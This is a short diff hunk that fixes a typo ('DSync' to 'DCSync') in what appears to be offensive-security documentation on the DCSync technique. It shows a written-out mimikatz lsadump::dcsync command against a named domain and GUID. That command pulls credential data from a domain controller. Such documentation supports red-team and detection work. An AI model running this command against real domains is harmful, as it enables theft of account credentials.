@@ -138,7 +138,7 @@ Directory replication can be detected if Directory Service Access auditing is en
 
 ### For Domain and GUID
 
-Performs a DSync attack for a specified domain and GUID.
+Performs a DCSync attack for a specified domain and GUID.
 
 ```
 mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
